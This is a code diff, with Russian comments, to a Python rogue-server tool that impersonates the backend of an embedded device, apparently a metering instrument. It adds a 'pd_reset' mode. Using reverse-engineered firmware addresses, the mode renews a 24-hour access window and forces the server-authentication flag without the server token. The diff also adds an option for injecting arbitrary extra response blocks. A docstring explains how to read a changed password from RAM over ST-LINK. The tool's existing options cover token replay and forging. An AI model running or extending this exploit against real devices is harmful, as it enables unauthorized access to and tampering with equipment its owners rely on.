@@ -34,6 +34,22 @@
   python3 smt_rogue_server.py --port 40000 --followup 'SET SERVER_URL=...\r\n'
   python3 smt_rogue_server.py --port 40000 --respond server_mt --server-mt 0   # replay
   python3 smt_rogue_server.py --port 40000 --respond server_mt --server-mt forge
+  python3 smt_rogue_server.py --port 40000 --respond pd_reset   # обновить 24ч-окно доступа
+  python3 smt_rogue_server.py --port 40000 --respond pd_reset --respond-extra '{ip:host:port}'
+
+Режим pd_reset
+--------------
+Прошивка (sub_08031698) обрабатывает ключ «pd» в ответе сервера следующим образом:
+  1. Устанавливает RAM[0x2000b468] = min(текущий uptime, 86400) — всегда 86400с в 2026 г.
+  2. Вычисляет RAM[0x2000b310] = RAM[0x2000b308] + 86400 — метку окончания доступа.
+  3. Устанавливает RAM[0x20000CAC] = 1 (переопределяет статус аутентификации сервера).
+  Значение, переданное в «pd», игнорируется — прибор читает свой uptime сам.
+  Без этого ключа RAM[0x2000b468] = 0 → окно доступа истекает немедленно.
+  Режим pd_reset обновляет это 24ч-окно без знания токена сервера.
+
+  Это НЕ меняет PASSWORD_PROVIDER (хранится в RAM[0x20000709], записывается только
+  через оптический порт, sub_0800B580). Если пароль изменён — читать его надо через
+  ST-LINK HotPlug (без останова CPU) из RAM[0x20000709] или EEPROM bank 0xA.
 """
 from __future__ import annotations
 
@@ -128,24 +144,35 @@ def analyse_inbound(buf: bytes) -> dict:
 
 
 def make_response(mode: str, n_records: int, raw: str | None, file: str | None,
-                  server_mt: str | None = None) -> bytes:
+                  server_mt: str | None = None,
+                  respond_extra: str | None = None) -> bytes:
+    extra = _unescape(respond_extra) if respond_extra else b""
     if mode == "accept":
-        return f"DATA ACCEPT:{n_records}\r\n".encode("latin1")
+        return f"DATA ACCEPT:{n_records}\r\n".encode("latin1") + extra
     if mode == "update":
-        return b"ACK update\r\n"
+        return b"ACK update\r\n" + extra
     if mode == "silent":
-        return b""
+        return b"" + extra
     if mode == "raw":
-        return _unescape(raw or "")
+        return _unescape(raw or "") + extra
     if mode == "file":
         with open(file, "rb") as f:
-            return f.read()
+            return f.read() + extra
     if mode == "server_mt":
         spec = (server_mt or "0").strip().lower()
         if spec == "forge":
-            return forge_server_mt()
-        return replay_server_mt(int(spec) if spec else 0)
-    return f"DATA ACCEPT:{n_records}\r\n".encode("latin1")
+            return forge_server_mt() + extra
+        return replay_server_mt(int(spec) if spec else 0) + extra
+    if mode == "pd_reset":
+        # Отправляем ключ «pd» в ответе.  Прошивка (sub_08031698) игнорирует
+        # переданное значение — она читает свой uptime через sub_080148C4 и
+        # устанавливает RAM[0x2000b468] = min(uptime, 86400).  В 2026 году uptime
+        # почти всегда > 2 679 001 с, поэтому значение всегда ограничивается 86400 с.
+        # RAM[0x2000b310] = RAM[0x2000b308] + 86400 → окно доступа 24 часа.
+        # RAM[0x20000CAC] = 1 (переопределяет токен аутентификации сервера).
+        body = f"DATA ACCEPT:{n_records}\r\n{{pd:1}}"
+        return body.encode("latin1") + extra
+    return f"DATA ACCEPT:{n_records}\r\n".encode("latin1") + extra
 
 
 def log_session(addr, buf, rep, sent, reaction):
@@ -205,7 +232,8 @@ def handle(conn, addr, args):
             typed = ""
         sent = _unescape(typed) if typed.strip() else make_response("accept", n, None, None)
     else:
-        sent = make_response(args.respond, n, args.raw, args.file, args.server_mt)
+        sent = make_response(args.respond, n, args.raw, args.file, args.server_mt,
+                             args.respond_extra)
         if args.followup:
             sent += _unescape(args.followup)
 
@@ -250,7 +278,8 @@ def main():
     ap.add_argument("--host", default="0.0.0.0")
     ap.add_argument("--port", type=int, default=40000)
     ap.add_argument("--respond",
-                    choices=["accept", "update", "silent", "raw", "file", "server_mt"],
+                    choices=["accept", "update", "silent", "raw", "file",
+                             "server_mt", "pd_reset"],
                     default="accept", help="что отвечать прибору")
     ap.add_argument("--raw", help="ответ для --respond raw (поддержка \\r\\n\\xHH)")
     ap.add_argument("--file", help="файл-ответ для --respond file")
@@ -258,6 +287,10 @@ def main():
                     help="для --respond server_mt: индекс образца 0-11 (replay реально "
                          "захваченного валидного token+tag) или 'forge' (синтаксически "
                          "валидный токен со случайным тегом — проверка, валидируется ли тег)")
+    ap.add_argument("--respond-extra",
+                    help="дополнительный JSON-блок, добавляемый ПОСЛЕ основного ответа "
+                         "(любой режим, кроме --interactive). Пример: '{ip:host:port}'. "
+                         "Поддержка \\r\\n\\xHH.")
     ap.add_argument("--followup", help="добить дополнительной строкой после ACK "
                                        "(проба server→device команды)")
     ap.add_argument("--interactive", action="store_true",
@@ -281,8 +314,13 @@ def main():
     except OSError as exc:
         sys.exit(f"[!] не удалось открыть {args.host}:{args.port}: {exc}")
     s.listen(5)
+    extra_tags = []
+    if args.respond_extra:
+        extra_tags.append(f"+extra:{args.respond_extra!r}")
+    if args.followup:
+        extra_tags.append("+followup")
     print(f"[*] слушаю {args.host}:{args.port} — жду сессию прибора "
-          f"(режим ответа: {args.respond}{' +followup' if args.followup else ''})")
+          f"(режим ответа: {args.respond}{(' ' + ' '.join(extra_tags)) if extra_tags else ''})")
     print(f"[*] наведи прибор сюда: SERVER_URL = <этот host>:{args.port} (вкладка «Команды») "
           "или сетевым перенаправлением. Ctrl+C — стоп.")
     try:
